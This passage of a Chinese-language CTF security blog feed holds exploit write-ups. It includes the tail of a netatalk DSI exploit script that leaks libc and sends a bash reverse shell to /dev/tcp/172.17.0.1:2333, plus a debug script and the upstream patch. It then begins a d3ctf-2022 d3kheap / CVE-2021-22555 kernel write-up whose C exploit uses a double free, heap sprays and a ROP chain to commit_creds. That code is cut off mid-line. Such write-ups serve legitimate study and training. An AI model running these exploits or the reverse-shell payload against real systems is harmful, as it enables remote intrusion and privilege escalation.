class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">adbyte = <span class="string">b'\x10'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">b''</span></span><br><span class="line">            payload += <span class="string">b'\x01'</span></span><br><span class="line">            payload += p8(<span class="number">0x10</span>+i+<span class="number">2</span>)</span><br><span class="line">            payload += <span class="string">b'a'</span>*<span class="number">0x10</span></span><br><span class="line">            payload += adbyte</span><br><span class="line">            payload += p8(j)</span><br><span class="line"></span><br><span class="line">            lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">            header = <span class="string">b''</span></span><br><span class="line">            header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">            header += <span class="string">b'\x04'</span> <span class="comment">#command</span></span><br><span class="line">            header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">            header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">            header += p32(lenth)</span><br><span class="line">            header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">            io.send(header+payload)</span><br><span class="line">            ret = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> ret == <span class="string">b''</span>:</span><br><span class="line">                <span class="keyword">raise</span> EOFError</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.success(<span class="string">"except"</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            io = remote(url,port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># log.success("success:"+str(i)+':'+hex(j))</span></span><br><span class="line">            adbyte+=p8(j)</span><br><span class="line">            log.success(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(adbyte,<span class="string">'little'</span>,signed=<span class="literal">False</span>)))</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            io.close()</span><br><span class="line">            io = remote(url,port)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line">adbyte += <span class="string">b'\x7f'</span></span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(adbyte,<span class="string">'little'</span>,signed=<span class="literal">False</span>)</span><br><span class="line">log.success(<span class="string">'leak:'</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,leak+<span class="number">0x5245ff0</span>)</span><br><span class="line">dl_rtld_lock_recursive = p.libc_base+<span class="number">0xed4f60</span></span><br><span class="line">dl_load_lock = p.libc_base+<span class="number">0xed4968</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io = remote(url,port)</span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'\x01'</span></span><br><span class="line">payload += <span class="string">b'\x18'</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">0x10</span>+pack(dl_load_lock,<span class="number">64</span>,<span class="string">'little'</span>,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">header = <span class="string">b''</span></span><br><span class="line">header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">header += <span class="string">b'\x04'</span> <span class="comment">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'bash -c "bash -i&gt;&amp; /dev/tcp/172.17.0.1/2333 0&lt;&amp;1"\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x5f8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += pack(p.system_addr-<span class="number">32</span>,<span class="number">64</span>,<span class="string">'little'</span>,<span class="literal">False</span>) <span class="comment">#-32是因为docker的libc和题目给的不一样</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">header = <span class="string">b''</span></span><br><span class="line">header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">header += <span class="string">b'\x01'</span> <span class="comment">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line"><span class="comment"># io.interactive()</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281601727.png"></p><h2 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">4399</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line"></span><br><span class="line"><span class="meta"># b main</span></span><br><span class="line">c</span><br><span class="line"><span class="built_in">set</span> detach-on-fork off</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"></span><br><span class="line">b dsi_opensession</span><br><span class="line">c</span><br><span class="line">b dsi_stream_receive</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>补丁就是加上了检测,限制option_len必须等于sizeof(dsi-&gt;attn_quantum).<br>(<del>有一说一,我并不理解补丁这里为什么不写成常量,attn_quantum的类型是uint32_t也与机器字长无关…..然而修复前的写法更是逆天.</del>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">  <span class="keyword">if</span> (option_len != <span class="keyword">sizeof</span>(dsi-&gt;attn_quantum)) {</span><br><span class="line">    LOG(log_error, logtype_dsi, <span class="string">"option %"</span>PRI<span class="string">u8" bad length: %zu"</span>,</span><br><span class="line">        cmd, option_len);</span><br><span class="line">    <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, &amp;dsi-&gt;commands[i], option_len);</span><br><span class="line">  dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br></pre></td></tr></tbody></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Data_Stream_Interface">https://en.wikipedia.org/wiki/Data_Stream_Interface</a><br><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/">https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/</a><br><a href="https://github.com/advisories/GHSA-j675-7hvj-qfw5">https://github.com/advisories/GHSA-j675-7hvj-qfw5</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf-2022 d3kheap与CVE-2021-22555</title>
      <link href="/2024/d3ctf-2022%20d3kheap%E4%B8%8ECVE-2021-22555/"/>
      <url>/2024/d3ctf-2022%20d3kheap%E4%B8%8ECVE-2021-22555/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>内核版本5.11(没有GFP_KERNEL_ACCOUNT的隔离),smap,smep,kpti,kaslr.<br>给了一次1024字节对象的double free,但未提供对该对象读写能力.</p><p>用户态pwn题对double free的处理一般是利用堆管理器,劫持freelist达成任意地址分配.且在此之前一般需要先获得一些地址信息.</p><p>在这里,我们需要通过一次对不具有读写能力的对象的double free完成信息泄露以及控制流劫持.这种效果在内核中反而容易办到,因为内核中有大量可以利用的结构体.</p><span id="more"></span><p>double free向use after free的转化:<br>    1.释放object.<br>    2.将空闲对象分配给目标对象victim<br>    3.利用double free释放victim<br>    (4.)将victim分配到某个具有读写能力的结构体并进行读写<br>此时对victim的使用便是use after free.</p><p>那么问题变成了,如何进行读写,选什么作为victim.</p><p>先来看读,读的目的是泄露victim中的地址信息,然而正常情况下,具有读能力的结构必须先写入数据再读取相应长度的数据,否则该结构本身就会造成信息泄露.所以直接通过某个结构体来读victim是不合理的.不过我们可以通过某个结构体来修改victim的某些字段,再利用victim去读其他结构完成信息泄露.<br>(后记: 实际上,更改一下分配顺序即可,先分配给具有读能力的结构进行写入,再分配给victim,此时即可直接读victim完成信息泄露,使用这种方法来泄露text段地址会使得解法一的稳定性大大增加.例子见解法二.)</p><p>那victim的选取就很常规了,msg_msg即可(越界读取).</p><p>能从kmalloc-1k中分配并具有写入能力的结构(或系统调用),常见的有setxattr,msg_msg,sk_buffer以及sendmsg.<br>经测试环境中setxattr无法使用(-ENOTSUP,也有可能是笔者操作有误),msg_msg有个header不太方便,sk_buffer虽然有个320字节的tail但对于总大小1k的对象来说,tail位于1k-320的位置,不影响对victim对象的写入.</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>越界读的对象,这里选取pipe_buffer来泄露kernel_base,msg_msg来泄露kernel_heap(用处下面再说).</p><p>完成泄露需要kmalloc-1k中这样的堆布局,由于一个next为NULL的msg_msg最多能读0x1000-0x30字节的数据,所以只能读到之后的三个object,这三个object中顺序不限,需要同时有一个msg_msg和pipe_buffer.由于同时依赖于这两个结构体,无法通过堆喷来稳定布局,使得该方法的稳定性大大降低.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401182225661.png"><br>(看起来能同时泄露kernel_base和kernel_heap的tty结构是更好的选择,但本题并没有挂载devpts)</p><blockquote><p>The Linux support for the above (known as UNIX 98 pseudoterminal<br>       naming) is done using the devpts filesystem, which should be<br>       mounted on /dev/pts</p></blockquote><p>接下来是劫持控制流的工作.这里采用UAF劫持pipe_buffer的operation函数表的方式.要想换个结构体继续UAF,就得再对之前的victim进行double free.释放之前用来写入的sk_buffer没有问题,但由于do_msgrcv的unlink操作,msg_msg(victim)的释放会导致panic.不过之前已经成功泄露了堆地址,再使用一次sk_buffer进行修复即可.</p><p>笔者到这才想到,(开启smap的情况下)劫持函数表需要先在已知地址伪造一个函数表.幸好之前已经有个堆地址了.<br>此堆地址指向其对应的msg_queue,于是我们可以通过堆喷在kmalloc-256中制造这样的堆布局(先进行占位,等泄露堆地址后释放再写入fake_operation).<br>此时fake_operation_addr = msg_queue-0xC0+256+0x30.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401182245735.png"></p><p>之后通过指向pipe_buffer的rsi进行栈迁移再ROP即可.栈迁移需要将rsi的值赋给rsp,然而我的ROPgadget并没有找到合适的gadget.看a3的wp才找到了这样一条gadget,暂时不知道如何去搜索这样复杂的gadget.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401172220415.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401172220504.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401172221348.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>成功率不高,但大多时候稳定在15-30次.<br>kmalloc-256中的堆喷可以修改一下,将msg_queue的分配放在连续堆喷的中间应该会提高成功率.这里笔者偷懒没调了,详见解法2中泄露堆地址的布局堆喷…</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">"/dev/d3kheap"</span>,O_RDWR);</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x1234</span>);</span><br><span class="line">    ioctl(dev_fd,<span class="number">0xDEAD</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> msgbuf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(msgbuf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> msgqid[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        msgqid[i] = get_msg_queue();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray msg_msg to keep space for fake pipe_buffer_operation in kmalloc-256"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;<span class="number">30</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">memset</span>(msgbuf, <span class="string">'\x33'</span>, <span class="number">0X1000</span>);</span><br><span class="line">        write_msg(msgqid[<span class="number">3</span>],msgbuf,<span class="number">256</span><span class="number">-0x30</span>,i);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray msg_msg for leak heap_addr"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">memset</span>(msgbuf, <span class="string">'A'</span> + i, <span class="number">0X1000</span>);</span><br><span class="line">        write_msg(msgqid[i],msgbuf,<span class="number">1024</span><span class="number">-0x30</span>,<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd,<span class="number">0xDEAD</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> <span class="title">fake_msg</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_msg,<span class="number">0</span>,<span class="keyword">sizeof</span>(fake_msg));</span><br><span class="line">    build_msg(&amp;fake_msg,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sk_socket[<span class="number">2</span>];</span><br><span class="line">    ret = socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_socket);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"socketpair"</span>);</span><br><span class="line">    </span><br><span class="line">    LOG(<span class="string">"write fake_msg"</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>* <span class="title">msgptr</span> =</span> buf;</span><br><span class="line">    *msgptr = fake_msg;</span><br><span class="line">    ret = write(sk_socket[<span class="number">0</span>],msgptr,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"write_sk_socket"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_fds[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">20</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = pipe(pipe_fds[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe"</span>);</span><br><span class="line">        ret =  write(pipe_fds[i][<span class="number">1</span>],<span class="string">"BBBBBBBB"</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_write"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Out-Of-Boundary peek_msg"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(msgbuf,<span class="string">'a'</span>,<span class="number">0x1000</span>);</span><br><span class="line">    ret = peek_msg(msgqid[<span class="number">0</span>],msgbuf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"peek_msg"</span>);</span><br><span class="line"></span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;(<span class="number">0x1000</span><span class="number">-0x30</span>)/<span class="number">8</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">size_t</span>* pval = ((<span class="type">size_t</span>*)msgbuf+i);</span><br><span class="line">        <span class="comment">// printf("[ ]data:0x%llx\n",*pval);</span></span><br><span class="line">        <span class="keyword">if</span>((*pval&amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>&amp;&amp;!kernel_heap_addr&amp;&amp;pval[<span class="number">3</span>]==<span class="number">1024</span><span class="number">-0x30</span>)</span><br><span class="line">        {</span><br><span class="line">            kernel_heap_addr = *pval;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]Kernel heap:0x%llx\n"</span>,kernel_heap_addr);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((*pval &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span> &amp;&amp;!kernel_base &amp;&amp; (*pval&amp;<span class="number">0xFFFFF</span>)==<span class="number">0x3fe40</span>)</span><br><span class="line">        {</span><br><span class="line">            kernel_base = *pval<span class="number">-0x103fe40</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]Kernel base:0x%llx\n"</span>,kernel_base);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!kernel_base||!kernel_heap_addr)</span><br><span class="line">        fail_exit(<span class="string">"Failed to leak kernel_base or kernel_heap"</span>);</span><br><span class="line">    </span><br><span class="line">    ret = read(sk_socket[<span class="number">1</span>],msgptr,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"read_sk_socket"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    build_msg(&amp;fake_msg,kernel_heap_addr,kernel_heap_addr,<span class="number">1</span>,<span class="number">1024</span><span class="number">-0x30</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    msgptr = buf;</span><br><span class="line">    *msgptr = fake_msg;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sk_sockets[<span class="number">32</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray sk_buffer to fix msg_msg"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_sockets[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"socketpair"</span>);</span><br><span class="line">        ret = write(sk_sockets[i][<span class="number">0</span>],msgptr,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write_sk_socket"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"free msg_msg"</span>);</span><br><span class="line">    read_msg(msgqid[<span class="number">0</span>],msgbuf,<span class="number">1024</span><span class="number">-0x30</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray pipe_buffer again"</span>);</span><br><span class="line">    <span class="type">int</span> pipe_fds2[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">20</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = pipe(pipe_fds2[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe"</span>);</span><br><span class="line">        ret =  write(pipe_fds2[i][<span class="number">1</span>],<span class="string">"BBBBBBBB"</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_write"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"free sk_buffer"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = read(sk_sockets[i][<span class="number">1</span>],msgptr,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"read_sk_socket"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//push rsi;pop rsp;test rdx,rdx;jle xxx; mov eax,0xffffffea;pop rbx;pop r12;pop r13;pop rbp;ret;</span></span><br><span class="line">    <span class="comment">//be98cb : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line">    <span class="type">size_t</span> gadget = kernel_base+<span class="number">0x2dbede</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = kernel_base+<span class="number">0x938f0</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_rep = kernel_base+<span class="number">0xbe98cb</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds_ptr = kernel_base+<span class="number">0x000d25c0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = kernel_base+<span class="number">0x000d2ac0</span>;</span><br><span class="line">    <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = kernel_base+<span class="number">0x00c00ff0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* <span class="built_in">stack</span> = mmap(<span class="number">0x504000</span>,<span class="number">0x4000</span>,<span class="number">7</span>,MAP_ANONYMOUS|MAP_PRIVATE,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">stack</span>,<span class="string">'4'</span>,<span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;<span class="number">30</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        read_msg(msgqid[<span class="number">3</span>],msgbuf,<span class="number">256</span><span 